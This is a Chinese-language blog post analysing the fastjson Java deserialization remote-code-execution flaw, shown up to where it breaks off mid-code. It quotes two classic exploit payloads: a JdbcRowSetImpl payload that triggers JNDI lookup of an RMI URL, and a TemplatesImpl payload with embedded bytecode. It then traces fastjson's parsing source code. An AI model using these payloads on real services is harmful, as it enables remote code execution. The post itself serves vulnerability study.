<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>fastjson RCE 分析 - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="简介
先看经典 payload
1{&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,&#34;dataSourceName&#34;:&#34;rmi://localhost:1099/Exploit&#34;,&#34;autoCommit&#34;:true}
"><meta property="og:image" content><meta property="og:title" content="fastjson RCE 分析"><meta property="og:description" content="简介
先看经典 payload
1{&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,&#34;dataSourceName&#34;:&#34;rmi://localhost:1099/Exploit&#34;,&#34;autoCommit&#34;:true}
"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-02-01T18:18:25+00:00"><meta property="article:modified_time" content="2020-02-01T18:18:25+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="fastjson RCE 分析"><meta name=twitter:description content="简介
先看经典 payload
1{&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,&#34;dataSourceName&#34;:&#34;rmi://localhost:1099/Exploit&#34;,&#34;autoCommit&#34;:true}
"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.663e493f1b86b15e1a34e0d009c73ba2a1b18b35c8ddaa1bca5cd40659294be1.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.cefce3efc3d1673a12499d1730c46db6951ef16bde19558cdb583fa050acc62e.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>fastjson RCE 分析</h1><div class=meta>发表于 2020 年 2 月 1 日</div></div><section class=body><h2 id=简介>简介</h2><p>先看经典 payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>{<span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,<span style=color:#ff79c6>&#34;dataSourceName&#34;</span>:<span style=color:#f1fa8c>&#34;rmi://localhost:1099/Exploit&#34;</span>,<span style=color:#ff79c6>&#34;autoCommit&#34;</span>:<span style=color:#ff79c6>true</span>}
</span></span></code></pre></div><p>简单来说原因是 fastjson 支持反序列类, 并通过 setter, getter 的方式来为类设置属性, 比如 <code>dataSourceName</code> 就会调用 <code>setDataSourceName("rmi://localhost:1099/Exploit")</code>, 而有些类在 setter 之中, 可能有些副作用. 比如这个 payload 中的 <code>com.sun.rowset.JdbcRowSetImpl</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>setAutoCommit</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>boolean</span> autoCommit<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> SQLException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>conn</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>conn</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAutoCommit</span><span style=color:#ff79c6>(</span>autoCommit<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>conn</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>connect</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>conn</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAutoCommit</span><span style=color:#ff79c6>(</span>autoCommit<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#8be9fd;font-style:italic>private</span> Connection <span style=color:#50fa7b>connect</span><span style=color:#ff79c6>()</span> <span style=color:#8be9fd;font-style:italic>throws</span> SQLException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>conn</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>conn</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDataSourceName</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>            Context ctx <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> InitialContext<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            DataSource ds <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>DataSource<span style=color:#ff79c6>)</span>ctx<span style=color:#ff79c6>.</span><span style=color:#50fa7b>lookup</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDataSourceName</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getUsername</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getUsername</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>?</span> ds<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getConnection</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getUsername</span><span style=color:#ff79c6>(),</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getPassword</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>:</span> ds<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getConnection</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>NamingException var3<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> SQLException<span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>resBundle</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>handleGetObject</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;jdbcrowsetimpl.connect&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getUrl</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>?</span> DriverManager<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getConnection</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getUrl</span><span style=color:#ff79c6>(),</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getUsername</span><span style=color:#ff79c6>(),</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getPassword</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>:</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>在 <code>setAutoCommit</code> 的时候会 <code>ctx.lookup</code>, 之后就是 JNDI 注入了, 先不管这个, 主要还是了解 fastjson 的问题.<br>除了这个 payload 还有一个基于 <code>TemplatesImpl</code> 的 payload,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>{<span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,<span style=color:#ff79c6>&#34;_bytecodes&#34;</span>:[<span style=color:#f1fa8c>&#34;yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQExxxx&#34;</span>],<span style=color:#ff79c6>&#34;_name&#34;</span>:<span style=color:#f1fa8c>&#34;a.b&#34;</span>,<span style=color:#ff79c6>&#34;_tfactory&#34;</span>:{ },<span style=color:#ff79c6>&#34;_outputProperties&#34;</span>:{ },<span style=color:#ff79c6>&#34;_version&#34;</span>:<span style=color:#f1fa8c>&#34;1.0&#34;</span>,<span style=color:#ff79c6>&#34;allowedProtocols&#34;</span>:<span style=color:#f1fa8c>&#34;all&#34;</span>}
</span></span></code></pre></div><p>这个 payload 相信如果看过 ysoserial 大概都能猜出来, 不过比较不同的他的触发方法比较奇特, 不是通过 setter 来触发, 相信看完下面的内容就能理解了.</p><h2 id=入口>入口</h2><p>一般用到最多的地方就是 spring 这种 framework, fastjson 提供了对应的接口</p><p>com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>@Override
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#8be9fd;font-style:italic>protected</span> Object <span style=color:#50fa7b>readInternal</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>&lt;?</span> <span style=color:#8be9fd;font-style:italic>extends</span> Object<span style=color:#ff79c6>&gt;</span> clazz<span style=color:#ff79c6>,</span> HttpInputMessage inputMessage<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> IOException<span style=color:#ff79c6>,</span> HttpMessageNotReadableException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff79c6>return</span> readType<span style=color:#ff79c6>(</span>getType<span style=color:#ff79c6>(</span>clazz<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>),</span> inputMessage<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#8be9fd;font-style:italic>private</span> Object <span style=color:#50fa7b>readType</span><span style=color:#ff79c6>(</span>Type type<span style=color:#ff79c6>,</span> HttpInputMessage inputMessage<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        InputStream in <span style=color:#ff79c6>=</span> inputMessage<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getBody</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>return</span> JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>parseObject</span><span style=color:#ff79c6>(</span>in<span style=color:#ff79c6>,</span> fastJsonConfig<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getCharset</span><span style=color:#ff79c6>(),</span> type<span style=color:#ff79c6>,</span> fastJsonConfig<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getParserConfig</span><span style=color:#ff79c6>(),</span> fastJsonConfig<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getParseProcess</span><span style=color:#ff79c6>(),</span> JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>DEFAULT_PARSER_FEATURE</span><span style=color:#ff79c6>,</span> fastJsonConfig<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getFeatures</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>JSONException ex<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> HttpMessageNotReadableException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;JSON parse error: &#34;</span> <span style=color:#ff79c6>+</span> ex<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getMessage</span><span style=color:#ff79c6>(),</span> ex<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>IOException ex<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> HttpMessageNotReadableException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;I/O error while reading input message&#34;</span><span style=color:#ff79c6>,</span> ex<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到调用的就是 <code>JSON.parseObject</code>, 这是用来解析 json objcet 的, 还有个 <code>JSON.parse</code>, 这个可以用来解析 <code>123</code>, <code>"123"</code> 之类的 primitive.</p><p>实际上 <code>JSON.parseObject</code> 有很多重载, 给 spring 写的接口与平常用的并不一样.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#ff79c6>&lt;</span>T<span style=color:#ff79c6>&gt;</span> T <span style=color:#50fa7b>parseObject</span><span style=color:#ff79c6>(</span>InputStream is<span style=color:#ff79c6>,</span> Charset charset<span style=color:#ff79c6>,</span> Type type<span style=color:#ff79c6>,</span> ParserConfig config<span style=color:#ff79c6>,</span> ParseProcess processor<span style=color:#ff79c6>,</span> <span style=color:#8be9fd>int</span> featureValues<span style=color:#ff79c6>,</span> Feature<span style=color:#ff79c6>...</span> features<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> IOException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>charset <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        charset <span style=color:#ff79c6>=</span> IOUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>UTF8</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bytes <span style=color:#ff79c6>=</span> allocateBytes<span style=color:#ff79c6>(</span>1024 <span style=color:#ff79c6>*</span> 64<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#8be9fd>int</span> offset <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(;;)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#8be9fd>int</span> readCount <span style=color:#ff79c6>=</span> is<span style=color:#ff79c6>.</span><span style=color:#50fa7b>read</span><span style=color:#ff79c6>(</span>bytes<span style=color:#ff79c6>,</span> offset<span style=color:#ff79c6>,</span> bytes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>-</span> offset<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>readCount <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span>1<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            <span style=color:#ff79c6>break</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        offset <span style=color:#ff79c6>+=</span> readCount<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>offset <span style=color:#ff79c6>==</span> bytes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>            <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> newBytes <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[</span>bytes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>*</span> 3 <span style=color:#ff79c6>/</span> 2<span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>arraycopy</span><span style=color:#ff79c6>(</span>bytes<span style=color:#ff79c6>,</span> 0<span style=color:#ff79c6>,</span> newBytes<span style=color:#ff79c6>,</span> 0<span style=color:#ff79c6>,</span> bytes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            bytes <span style=color:#ff79c6>=</span> newBytes<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>(</span>T<span style=color:#ff79c6>)</span> parseObject<span style=color:#ff79c6>(</span>bytes<span style=color:#ff79c6>,</span> 0<span style=color:#ff79c6>,</span> offset<span style=color:#ff79c6>,</span> charset<span style=color:#ff79c6>,</span> type<span style=color:#ff79c6>,</span> config<span style=color:#ff79c6>,</span> processor<span style=color:#ff79c6>,</span> featureValues<span style=color:#ff79c6>,</span> features<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> JSONObject <span style=color:#50fa7b>parseObject</span><span style=color:#ff79c6>(</span>String text<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    Object obj <span style=color:#ff79c6>=</span> parse<span style=color:#ff79c6>(</span>text<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>obj <span style=color:#ff79c6>instanceof</span> JSONObject<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>(</span>JSONObject<span style=color:#ff79c6>)</span> obj<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>(</span>JSONObject<span style=color:#ff79c6>)</span> JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toJSON</span><span style=color:#ff79c6>(</span>obj<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>RuntimeException e<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
